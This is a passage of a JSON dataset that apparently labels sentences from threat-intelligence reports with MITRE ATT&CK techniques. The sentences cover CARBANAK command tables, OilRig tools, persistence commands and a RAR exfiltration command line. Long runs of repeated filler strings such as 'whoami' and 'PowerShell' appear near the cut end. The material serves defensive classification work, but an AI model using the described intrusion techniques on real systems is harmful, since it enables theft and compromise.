            "Thread Name   Description    Key logger  Logs key strokes for configured processes and sends them to the command and control (C2) server    Form grabber  Monitors HTTP traffic for form data and sends it to the C2 server    POS monitor  Monitors for changes to logs stored in C:\\NSB\\Coalition\\Logs and nsb.pos.client.log and sends parsed data to the C2 server    PST monitor  Searches recursively for newly created Outlook personal storage table (PST) files within user directories and sends them to the C2 server    HTTP proxy monitor  Monitors HTTP traffic for requests sent to HTTP proxies, saves the proxy address and credentials for future use    Table 1: Monitoring threads Commands In addition to its file management capabilities, this data-stealing backdoor supports 34 commands that can be received from the C2 server"
        ]
    },
    "timestomp system network configuration discovery-multi": {
        "technique_names": [
            "timestomp",
            "system network configuration discovery"
        ],
        "sentances": [
            "Command Hash   Command Name   Description    0x0AA37987  loadconfig  Runs each command specified in the configuration file (see the Configuration section)"
        ]
    },
    "exfiltration over command and control channel remote file copy fallback channels-multi": {
        "technique_names": [
            "exfiltration over command and control channel",
            "remote file copy",
            "fallback channels"
        ],
        "sentances": [
            "0x007CFABF  video  Desktop video recording    0x06E533C4  download  Downloads executable and injects into new process    0x00684509  ammyy  Ammyy Admin tool    0x07C6A8A5  update  Updates self    0x0B22A5A7  \u00a0  Add/Update klgconfig (analysis incomplete)    0x0B77F949  httpproxy  Starts HTTP proxy    0x07203363  killos  Renders computer unbootable by wiping the MBR    0x078B9664  reboot  Reboots the operating system    0x07BC54BC  tunnel  Creates a network tunnel    0x07B40571  adminka  Adds new C2 server or proxy address for pseudo-HTTP protocol    0x079C9CC2  server  Adds new C2 server for custom binary protocol    0x0007C9C2  user  Creates or deletes Windows user account    0x000078B0  rdp  Enables concurrent RDP (analysis incomplete)    0x079BAC85  secure  Adds Notification Package (analysis incomplete)    0x00006ABC  del  Deletes file or service    0x0A89AF94  startcmd  Adds command to the configuration file (see the Configuration section)    0x079C53BD  runmem  Downloads executable and injects directly into new process    0x0F4C3903  logonpasswords  Send Windows accounts details to the C2 server    0x0BC205E4  screenshot  Takes a screenshot of the desktop and sends it to the C2 server    0x007A2BC0  sleep  Backdoor sleeps until specified date    0x0006BC6C  dupl  Unknown    0x04ACAFC3  \u00a0  Upload files to the C2 server    0x00007D43  vnc  Runs VNC plugin    0x09C4D055  runfile  Runs specified executable file    0x02032914  killbot  Uninstalls backdoor    0x08069613  listprocess  Returns list of running processes to the C2 server    0x073BE023  plugins  Change C2 protocol used by plugins    0x0B0603B4  \u00a0  Download and execute shellcode from specified address    0x0B079F93  killprocess  Terminates the first process found specified by name    0x00006A34  cmd  Initiates a reverse shell to the C2 server    0x09C573C7  runplug  Plugin control    0x08CB69DE  autorun  Updates backdoor    Table 2: Supported Commands Configuration A configuration file resides in a file under the backdoor\u2019s installation directory with the .bin extension"
        ]
    },
    "obfuscated files or information data encoding-multi": {
        "technique_names": [
            "obfuscated files or information",
            "data encoding"
        ],
        "sentances": [
            "The encrypted message is then Base64 encoded, replacing all the \u2018/\u2019 and \u2018+\u2019 characters with the \u2018.\u2019 and \u2018-\u2019 characters, respectively",
            "The SHA256 hash is then base64 encoded, which results in an encoded string of EfZrVfPSQwNiHl75VlsCpXbMWLxfh4nK6Ww9QABkuQ4=, of which the first 24 characters are used as the 3DES key",
            "A string with the 5-character length and encoded with BASE64 is added to the beginning of the buffer encoded using the BASE64 algorithm",
            "For instance, the following 15 bytes were used to generate an HTTP parameter during our analysis:    Random Value Constant Value agent_id   0F EE C8 83 56 0E 9F F0 EB 98 43 30 30 30 30    The resulting ciphertext is then encoded using XAgent\u2019s base64 encoding routine that starts by building the following encoding alphabet: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_ As you can see, this is not the standard base64 alphabet, rather it is the \u201cURL and Filename safe\u201d Base 64 Alphabet from RFC 4648, as the \u201c+\u201d in the standard alphabet is replaced with \u201c-\u201d and the \u201c/\u201d replaced with \u201c_\u201d"
        ]
    },
    "standard application layer protocol connection proxy-multi": {
        "technique_names": [
            "standard application layer protocol",
            "connection proxy"
        ],
        "sentances": [
            "Figure 5: Sample pseudo-HTTP beacon The pseudo-HTTP protocol uses any proxies discovered by the HTTP proxy monitoring thread or added by the adminka command"
        ]
    },
    "standard cryptographic protocol obfuscated files or information-multi": {
        "technique_names": [
            "standard cryptographic protocol",
            "obfuscated files or information"
        ],
        "sentances": [
            "All subsequent messages are encrypted with AES in CBC mode"
        ]
    },
    "masquerading": [
        "What changes in the code can we see in such short time intervals that would not be present in a build tool? In one case, one build was programmed to execute the runmem command for a file named wi.exe while the other was not",
        "This is consistent with most espionage-motivated adversaries, as once the adversary gains access via legitimate credentials, they are able to masquerade as a legitimate user and essentially become an insider threat",
        "Filename SHA256 Description   7za.exe dd6d7af00ef4ca89a319a230cdd094275c3a1d365807fe5b34133324bdaa0229 7-Zip 17.01 beta    nbt.exe c9d5dc956841e000bfd8762e2f0b48b66c79b79500e894b4efa7fb9ba17e4e9e nbtscan 1.0.35    rx.exe a6a0fbfee08367046d3d26fb4b4cf7779f7fb6eaf7e60e1d9b6bf31c5be5b63e IntelliAdmin Remote Execute v1.0    Table 5",
        "Filename SHA256 Description   7za.exe dd6d7af00ef4ca89a319a230cdd094275c3a1d365807fe5b34133324bdaa0229 7-Zip 17.01 beta   hb.exe 3ca3a957c526eaeabcf17b0b2cd345c0fffab549adfdf04470b6983b87f7ec62 Hobocopy   nbt.exe c9d5dc956841e000bfd8762e2f0b48b66c79b79500e894b4efa7fb9ba17e4e9e nbtscan 1.0.35   rx.exe a6a0fbfee08367046d3d26fb4b4cf7779f7fb6eaf7e60e1d9b6bf31c5be5b63e IntelliAdmin Remote Execute v1.0   tardigrade.exe fe1b011fe089969d960d2dce2a61020725a02e15dbc812ee6b6ecc6a98875392 Tardigrade application",
        "CTU researchers identified BRONZE UNION actors using a file named ms.exe that was likely a credential-abuse tool from the Kekeo toolset",
        "In one instance, the threat actor gained remote access to a high-value system in a compromised network, ran quser.exe to identify existing RDP sessions on the device, immediately ran a command to compile a RAR archive that specified file types the threat actor did not want, and used a password to encrypt the archive:  YYYY-MM-DD hh:mm:ss     quser YYYY-MM-DD hh:mm:ss     C:\\windows\\temp\\svchost.exe a -m5 -v2000m -hp{password} -inul -r \"{destination_file.rar}\" \"{multiple user directories linked to the victim's projects}\" -x*.exe -x*.msi -x*.cab -x*.inc -x*.dll -x*.db -x*.mdb -x*.htm -x*.html -x*.css -x*.jar -x*.js -x*.tmp -x*.bak -x*.dat -x*.log -x*.xml -x*.dmp -x*.dbf -x*.avi -x*.mp3 -x*.mp4 -x*.mpg -x*.mpeg -x*.asp -x*.aspx -x*.gif -x*.jpg -x*.mpp -x*.pst  The threat actors typically rename the encrypted RAR archives",
        "SHA256  a77f9e441415dbc8a20ad66d4d00ae606faab370ffaee5604e93ed484983d3ff   MD5 1ff40e79d673461cd33bd8b68f8bb5b8   Compiled 2017.08.06 11:32:36 (GMT), 2.22   Type I386 Windows Console EXE   Size 101 888    Instead of implementing this auxiliary module in the form of a dynamic linked library with its corresponding exported functions, the developers decided to use a standalone executable started by events.exe with the following parameters:    Parameter Description   -scr Screenshot file name to save in Cache006 subdirectory, zipped with password from configuration",
        "The file is named netwf.dat",
        "For example, APT32 installed one backdoor as a persistent service with a legitimate service name that had a Unicode no-break space character appended to it",
        "The account names visually look similar to legitimate government organization names or other trusted third-party entities",
        "The initial overlap was based on the filename wmssl.exe, which was seen as an executable name that Cannon would move the wmssl.txt attachment to install and execute a secondary payload",
        "Writing executables to a randomly-selected directory under Program Files, and naming the EXE to match the chosen directory name, or, if that fails, writing the executable to a system-generated temporary file name, using the EXE extension   3",
        "The malware drops the Windows batch file dx.bat, which attempts to kill the task daumcleaner.exe; a Korean security program",
        "Bankshot implants are distributed from a domain with a name similar to that of the cryptocurrency-lending platform Falcon Coin, but the similarly named domain is not associated with the legitimate entity",
        "The \u201cVPN Client\u201d is a legitimate Juniper VPN software bundled with Helminth, \u00a0a malware in use by the OilRig threat agnet: JuniperSetupClientInstaller.exe 6a65d762fb548d2dc56cfde4842a4d3c (VirusTotal link) If the victim downloads and installs the file, their computer would get infected, while the legitimate VPN software is installed",
        "For example, we analyzed a DropIt sample (SHA256: cca268c13885ad5751eb70371bbc9ce8c8795654fedb90d9e3886cbcfe323671) that dropped two executables, one of which was saved to \u201c%TEMP%\\flash_update.exe\u201d that was a legitimate Flash Player installer",
        "Figure 10: Network traffic to download final payload (words.exe) Once executed, the file performs the following activities:  Drops a copy of itself in %AppData%\\svchost.exe\\svchost.exe and drops an XML file, which contains configuration information for Task Scheduler (as shown in Figure 11)",
        "Firstly, the reason this has been named MirageFox instead of just Mirage, is because in the Export directory for the modules, the name field is filled with a string MirageFox_Server.dat",
        "SHA256 Filename PowerShell Filename Variant   5f001f3387ddfc0314446d0c950da2cec4c786e2374d42beb3acce6883bb4e63 <redacted> Technical Services.exe Office365DCOMCheck.ps1 Bat2exe   d948d5b3702e140ef5b9247d26797b6dcdfe4fdb6f367bb217bc6b5fc79df520 tafahom.exe, Sales Modification.exe SystemDiskClean.ps1 .NET    Table 1",
        "The wave against the government entity (June 26) also involved a simple PE file attachment (SHA256: d948d5b3702e140ef5b9247d26797b6dcdfe4fdb6f367bb217bc6b5fc79df520) using the filename tafahom.exe",
        "After the .NET PE file has been run, we observed the same behavior as the above QUADAGENT sample of dropping a PowerShell script with the filename SystemDiskClean.ps1 alongside a VBScript file with the same name",
        "The Downloader After the exploit or script executes, the system downloads install.exe, which has the following metadata: MD5\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 5a0c4e1925c76a959ab0588f683ab437 Size\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 46592 bytes Compile Time\u00a0\u00a0\u00a0 2014-11-19 08:55:10Z Import Hash\u00a0 \u00a0\u00a0\u00a06b8611f8148a6b51e37fd68e75b6a81c The file install.exe attempts to write two files (doc.exe and test.exe) to the hard-coded path \u201cC:\\Users\\Public\u201d, which fails on Windows XP because that path is not present by default",
        "One example of these samples is given below: SHA256:6500636c29eba70efd3eb3be1d094dfda4ec6cca52ace23d50e98e6b63308fdb The file is a self-extracting RAR, which is a common delivery mechanism for PlugX particularly when the eventual payload will be sideloaded by a legitimate executable",
        "Filename qrat.exe   File Size 1093120 bytes   MD5 c05e5131b196f43e1d02ca5ccc48ec0e   SHA1 f28c592833f234c619917b5c7d8974840a810247   Notes Dropper that installs QuasarRAT file microsoft_network.exe and scheduled task wrapper file Microsoft.Win32.TaskScheduler.dll",
        "Filename  Part-I.doc    File Size  11349102 bytes    MD5  92942c54224cd462dd201ae11a560bb8    SHA1  85a21624df2211af3daf05c86a3fbea8271059d3    Notes Malicious RTF document that exploits CVE-2017-8570 and drops QuasarRAT file qrat.exe",
        "Filename  Part-II.doc    File Size  10156713 bytes    MD5  e32668e569362c96cc56db368b7e821e    SHA1  dadc493abbe3e21610539e1d5a42f523626a6132    Notes Malicious RTF document that exploits CVE-2017-8570 and drops QuasarRAT file mico-audio.exe",
        "Filename  vsrss.exe    File Size  446976 bytes    MD5  5c3456d5932544b779fe814133344fdb    SHA1  7ab750afb25457a81c27a98dc6dfd51c27e61b0e    Notes Delphi RAT file that beacons to ebeijingcn.live",
        "When the shellcode embedded within the malicious EPS is executed, the following three files are dropped:  %PROGRAMDATA%\\Microsoft\\DeviceSync\\VMwareCplLauncher.exe %PROGRAMDATA%\\Microsoft\\DeviceSync\\vmtools.dll %PROGRAMDATA%\\Microsoft\\DeviceSync\\MSBuild.exe  In the list of dropped files, VMwareCplLauncher.exe is a legitimate, signed VMware executable that serves to ultimately deliver the BADNEWS payload",
        "The vmtools.dll file is a modified DLL that both ensures persistence and loads MSBuild.exe, which is the BADNEWS malware renamed to spoof a legitimate Microsoft Visual Studio tool",
        "These digital certificates are often issued in the name of rogue and legitimate companies to avoid arousing suspicion from researchers and incident responders",
        "In one instance we observed, one of the initial malware delivered to the victim, RATANKBA (TROJ_RATANKBA.A), connects to a legitimate but compromised website (eye-watch[.]in:443, a mobile application-selling site) from which a hack tool (nbt_scan.exe) is also downloaded",
        "One archive sample analyzed by CTU researchers contained a legitimate PDF file, a benign image of interest to targets (see Figure 8), and an HttpBrowser installer disguised as an image file",
        "The legitimate owaauth.dll file resides in %ProgramFiles%\\Microsoft\\Exchange Server\\ClientAccess\\Owa\\Auth\\ while CTU researchers have observed the backdoor using the same filename in the %ProgramFiles%\\Microsoft\\Exchange Server\\ClientAccess\\Owa\\bin\\ directory",
        "It was pretending to be an Adobe flash player update installer on a compromised website to lure users to click for the execution",
        "",
        "Whitefly frequently delivers Vcrodat as a malicious DLL that has the same name as DLLs belonging to legitimate software from various security vendors.",
        "likely in an attempt to masquerade as a red-teaming tool rather than an advanced actor",
        "It named Meterpreter as a WAV file type, probably in the hope that this would not raise suspicions"
    ],
    "connection proxy system network connections discovery-multi": {
        "technique_names": [
            "connection proxy",
            "system network connections discovery"
        ],
        "sentances": [
            "FIN7 uses CARBANAK as a post-exploitation tool in later phases of an intrusion to cement their foothold in a network and maintain access, frequently using the video command to monitor users and learn about the victim network, as well as the tunnel command to proxy connections into isolated portions of the victim environment"
        ]
    },
    "windows admin shares": [
        "Additionally, some of this early activity shares a similarity with current FIN7 operations \u2013 the use of Power Admin PAExec for lateral movement"
    ],
    "system owner/user discovery account discovery-multi": {
        "technique_names": [
            "system owner/user discovery",
            "account discovery"
        ],
        "sentances": [
            "This account was suspended in short order, but immediately after the suspension, an alternate account with the username @dookhtegan1 with the same stylized profile image appeared and is still currently active",
            "An example of this buffer at runtime is below: \u00a0 00000000: 43 3A 5C 55 73 65 72 73\u00a0 5C 4D 53 5C 44 65 73 6B\u00a0 C:\\Users\\MS\\Desk 00000010: 74 6F 70 5C 52 53 2D 41\u00a0 54 54 20 56 33 5C 50 6C\u00a0 top\\RS-ATT V3\\Pl 00000020: 75 67 69 6E 42 69 6E 00\u00a0 00 00 00 00 00 00 00 00\u00a0 uginBin\u2026\u2026\u2026uginBin\u2026\u2026\u2026 [TRUNCATED] 00000100: 00 00 00 00 43 3A 5C 55\u00a0 73 65 72 73 5C 4D 53 5C\u00a0 \u2026.C:\\Users\\MS\\ 00000110: 44 65 73 6B 74 6F 70 5C\u00a0 52 53 2D 41 54 54 20 56\u00a0 Desktop\\RS-ATT V 00000120: 33 5C 5A 43 6F 6E 66 69\u00a0 67 00 00 00 00 00 00 00\u00a0 3\\ZConfig\u2026\u2026.ZConfig\u2026\u2026"
        ]
    },
    "credential dumping exfiltration over command and control channel-multi": {
        "technique_names": [
            "credential dumping",
            "exfiltration over command and control channel",
            "ping"
        ],
        "sentances": [
            "Tweets by second account @dookhtegan1 providing a Telegram channel with the leaked files Data Dump Contents The contents of the data dump includes various types of datasets that appear to be results from reconnaissance activity, initial compromises, and tools the OilRig operators use against target organizations"
        ]
    },
    "launch agent": [
        "The Glimpse panel showing three compromised systems To interact with a specific agent, the actor selects the entry to open in the agent control panel",
        "Using a custom User Agent string or the system's User Agent string derived from urlmon.dll   7",
        "Property list with persistence settings launchctl load /Library/LaunchDaemons/filename.plist > /dev/nul or launchctl load ~/Library/LaunchAgents/ filename.plist > /dev/nul will then command the operating system to start the dropped backdoor file at login",
        "Persistence Once started, the Keydnap backdoor installs a plist file in /Library/LaunchAgents/ if it has root privileges or $USER/Library/LaunchAgents/ otherwise to achieve persistence across reboots",
        "From the 185.25.50[.]93 C2 IP, we discovered another hard-coded user agent being used by Zebrocy: Mozilla/5.0 (Windows NT 6.1; WOW64) WinHttp/1.6.3.8 (WinHTTP/5.1) like Gecko We observed several samples of Zebrocy using this user agent targeting the foreign affairs ministry of a large Central Asian nation"
    ],
    "launch agent remote file copy-multi": {
        "technique_names": [
            "launch agent",
            "remote file copy"
        ],
        "sentances": [
            "The agent control panel has three tabs that have interfaces that allow the actor to issue commands, as well as upload and download files to and from the agent"
        ]
    },
    "system owner/user discovery": [
        "Figure 6 shows the Glimpse server responding to an inbound beacon from the Glimpse agent and sending a command whoami",
        "The screenshot also shows the Glimpse server receiving the results of the whoami command executed by the agent",
        "The webshell will save the archives locally to the server in the C:\\Users\\Public\\Libraries\\Recorded\\Files folder, each with a filename with the following structure: [IP address]_c$_Users_[username]__[Desktop-Documents-Downloads]_[year]-[month]-[day]-[hours]-[minutes]-[seconds].7z It is likely that the threat actors use this functionality to rapidly check for new files created by users on the network",
        "There was a slight deviation in the November grouping, where the three samples we collected still used the Joohn author name for the last modified field but reverted to a default USER/user author name for the creator field",
        "This document was also the first of the mid-November cluster which used the user/USER author name instead of Joohn, further supporting the scenario of the document being copied between systems",
        "The same code snippets are combined into a second stage JavaScript in \u201cC:\\Users\\<User Name>\\\u201d",
        "The username appears to be attacker specified and has occurred in 2017 Bankshot samples",
        "This links the previous samples with this unique username",
        "If the Trojan does not have root privileges to enable its automatic launch, it creates the \u201c~/.config/autostart/dbus-inotifier.desktop\u201d file with the following contents: [Desktop Entry] Type=Application Exec=/home/user/.config/dbus-notifier/dbus-inotifier Name[en_EN]=system service d-bus notifier Name=system service d-bus notifier Comment[en_EN]= Comment= \u201c/home/user/\u201d stands here for the environment variable HOME",
        "Note that the username could be a small joke on the attackers\u2019 part regarding the attribution to FIN7",
        "The magic value 0xFEEDFACF that belongs to Mach-O Executable (64 bit) Methods GET_LAUNCHNAME and GET_LABELNAME will return the hardcoded name of the property list \u201c.plist\u201d for the root user (com.apple.screen.assistantd.plist) and for the regular user (com.apple.spell.agent.plist)",
        "Also, this variant of OopsIE uses the output of the whoami command as the parameter within the URL when communicating with the C2 server, which differs from the previous OopsIE variant that used the hostname and username from the environment variables",
        "The executable obtains an embedded PowerShell script, decrypts it using RC4, then decompresses it using ZLIB, and saves the cleartext to C:\\Users\\<username>\\AppData\\Roaming\\Out.jpg",
        "code(2343)\", MsgBoxStyle.Critical, null);     The dropper then writes the content of the payload which resides as plaintext in a resource within the .NET assembly to C:\\Users\\<username>\\AppData\\Local\\Temp\\SystemDiskClean.ps1",
        "File is dropped to C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft Network\\microsoft_network\\1.0.0.0\\microsoft_network.exe",
        "File starts as mico-audio.exe and installs to C:\\Users\\%USERNAME%\\AppData\\Roaming\\google-chrome\\crome.exe",
        "These strings have the following format:uuid=[Victim ID]#un=[Username]#cn=[Hostname]#on=[OS Version]#lan=[IP Address]#nop=#ver=1.0uuid=[Victim ID]#un=[Username]#An example of the first string may be seen below:uuid=e29ac6c0-7037-11de-816d-806e6f6e696351c5#un=Josh Grunzweig#cn=WIN-LJLV2NKIOKP#on=mav6miv1#lan=192.168.217.141#nop=#ver=1.0It should be noted that the variables used for this string are different from previous versions",
        "For example, in the previous variant of BADNEWS, the victim\u2019s unique identifier was stored under a variable named \u2018uid\u2019, the username was stored in a variable named \u2018u\u2019, etc",
        "Unique User-Agents The unique User-Agents used in the HTTP communication between SpeakUp to the C&C are a possible path to the identity of the threat actor behind this campaign",
        "(Source: Dell SecureWorks) Further research revealed additional tools containing the same username (see Figure 21)",
        "PDB strings containing the 'SyberSpace' username",
        "The SP variable is a string containing the victim's username",
        "When the malicious ISAPI filter captures a username matching this variable, it knows to handle the incoming HTTP request as a command to the web shell",
        "It also attempts to issue the following SQL query on the \u201csignons.sqlite\u201d file: \u201cSELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins WHERE timePasswordChanged/1000 BETWEEN ? AND ?\u201d   117 ftpUpload Uses FTPManager:uploadFile method and a supplied server name, username and password",
        "The shellcode performs a system survey to collect the victim's computer name and username and then appends those values to a URL string using libjs.inquirerjs[.]com.",
        "Command ID 17 indexes to a function that collects the system information and sends it to the C2 server.",
        "",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "collect usernames",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        "whoami ",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user",
        " query user"
    ],
    "standard application layer protocol masquerading launch agent-multi": {
        "technique_names": [
            "standard application layer protocol",
            "masquerading",
            "launch agent"
        ],
        "sentances": [
            "Filename SHA256 Description   poisonfrog.ps1 27e03b98ae0f6f2650f378e9292384f1350f95ee4f3ac009e0113a8d9e2e14ed Dropper that installs hUpdater.ps1 and dUpdater.ps1   hUpdater.ps1 995ea68dcf27c4a2d482b3afadbd8da546d635d72f6b458557175e0cb98dd999 Poison Frog agent that uses HTTP for C2   dUpdater.ps1 0f20995d431abce885b8bd7dec1013cc1ef7c73886029c67df53101ea330436c Poison Frog \u00a0agent that uses DNS tunneling for C2    Table 3"
        ]
    },
    "scripting": [
        "According to the server\u2019s code, the default command that it would issue to newly infected systems was a batch script contained in a file named 0000000000.bat",
        "Code comparison between the default batch script issued by Poison Frog\u2019s C2 and a batch script received by the Helminth Trojan Webshells The data dump included several different webshells apparently used by OilRig to interact with compromised servers",
        "After execution, the malware will use the Dropbox API to make an HTTP GET request using HTTPS over TCP port 443 for the files:  MD5  Filename  d76261ba3b624933a6ebb5dd73758db4  WmiApCom  79b68cdd0044edd4fbf8067b22878644  WmiApCom.bat   The \u201cWmiApCom.bat\u201d file is simply used to start \u201cWmiApCom\u201d, which happens to be the exact same file as the one dropped by the malicious Word documents",
        "Attackers using Comnie are leveraging malicious macros that initially hide decoy documents and shows them when the victim enables macros",
        "Comnie allows the attacker to provide and subsequently execute a batch script (BAT), executable file (EXE), or dynamic-link library (DLL)",
        "While all payloads can be dynamically updated, at the time of delivery, this task launched a COM scriptlet (\u201c.sct\u201d file extension) that downloaded and executed Meterpreter hosted on images.chinabytes[.]info",
        "VBScript #1 The dropped script \u201c58d2a83f7778d5.36783181.vbs\u201d acts as a launcher",
        "When, finally, the first stage shellcode receives a special \u201cFF\u201d signal, it then executes the delivered shellcode",
        "For example, they stated DROPSHOT uses more advanced anti-emulation techniques, utilizes external scripts for self-deletion, and uses memory injection versus external drivers for deployment",
        "The following are the three files:   Defender.sct \u2013 The malicious JavaScript based scriptlet file",
        "Users can protect themselves from such attacks by disabling Office macros in their settings and also by being more vigilant when enabling macros (especially when prompted) in documents, even if such documents are from seemingly trusted sources",
        "While we have not been able to obtain a secondary payload from the Unicorn generated PowerShell script, we believe that this group uses the script to deliver Metasploit\u2019s Meterpreter as a potential payload as well",
        "Specifically, we discovered code in the PowerShell script that was a match for code in Magic Unicorn containing the comment \u201cone line shellcode injection with native x86 shellcode\u201d",
        "bat: A batch file to set up the service COMSysApp, for an x64 system bat: A batch file to set up the service COMSysApp, for an x86 system ini: A data file with Base64-encoded data for connecting to an FTP server",
        "Via WMI (winmgmt), the JavaScript or VBscript code in the SCT file spawns a PowerShell one-liner which finally consumes the text file",
        "Character  Description  0  File contains batch commands, it executes the batch commands  1  Rename the temporary file as .ps1 extension  2  Rename the temporary file as .vbs extension   Table 2: BONDUPDATER Actions Figure 8 is a screenshot of BONDUPDATER\u2019s DGA implementation",
        "To run persistently on the system, the Trojan will first create a VBScript file:SpecialFolder.CommonApplicationData\\srvResesponded.vbs that contains:CreateObject(\u201cWScript.Shell\u201d).Run(\u201c%app%\u201d) The Trojan replaces the %app% string in the above VBScript with the path to its executable",
        "The group often uses the trial version of Cobalt Strike, a publicly available commercial software for \u201cAdversary Simulations and Red Team Operations.\u201d Other public tools used by the group are Metasploit, a well-known free and open source framework for developing and executing exploit code against a remote target machine; Mimikatz, a post-exploitation tool that performs credential dumping; and Empire, \u201ca PowerShell and Python post-exploitation agent.\u201d For detection and exploitation of internet-facing web servers, CopyKittens use Havij, Acunetix and sqlmap",
        "The second file is a PowerShell script which appears to be based on a Rapid7 Ruby Exploitation script that loads arbitrary shellcode",
        "Next, it will copy the first stage shellcode in memory and create a new thread with the shellcode running in it, the code responsible for this execution is shown in Figure 1",
        "For that we can use a Python script, included in Appendix B \u2013 Python Scripts",
        "However, in order to kick off the execution of the malware the attacker uses a batch script which executes the malware, but the batch script does more than simply initiate execution of the malware",
        "The full contents of the batch script are given in Appendix C \u2013 a.bat",
        "Essentially, we are discussing ongoing activity revolving around several malware families:  KopiLuwak and IcedCoffeer Carbon Mosquito WhiteBear  Technical Rattle Turla\u2019s Shifting to Scripting KopiLuwak and IcedCoffee, WhiteBear, and WhiteAtlas Since at least 2015 Turla has leveraged Javascript, powershell, and wsh in a number of ways, including in their malware dropper/installation operations as well as for implementing complete backdoors",
        "The image is downloaded directly, and the shellcode is loaded and executed in memory",
        "(On the left is NavRAT, and on the right is the shellcode of ROKRAT):    We performed the same analysis for the shellcode located in the downloaded image file and the shellcode is not exactly the same, but the design is very similar",
        "Figure 3: Script code embedded in 29[.]html used to download and run Revenge RAT The script shown in Figure 4 is almost identical to the one used by the script contents of 29[.]html (in Figure 3), the only difference being the absence of a sleep command and the usage of the \u201cforfiles\u201d utility",
        "The downloaded document template contains the malicious macro codes, which executes a VBScript (VBS).",
        "The attackers typically distribute Netwalker ransomware with the use of a reflective PowerShell loader script that has been protected from casual analysis with several layers of obfuscation.",
        "The attackers orchestrate attacks using batch or PowerShell scripts that are executed, with the help of domain controllers, on any machine the DC can reach.",
        "So this method uses psexec itself to copy the payload over the network, overwrite earlier versions (if found), and run it without waiting for any response. They use batch files that leverage psexec , again, to push PowerShell loader scripts out to machines the network scanner finds on the internal network.",
        "",
        "The files uploaded to this webshell included the same compiled python script that would scan remote systems that were vulnerable to CVE-2017-0144 (EternalBlue) that we saw uploaded to the other errr.aspx webshell.",
        "",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        "Javascript ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " PowerShell ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
        " VBScript ",
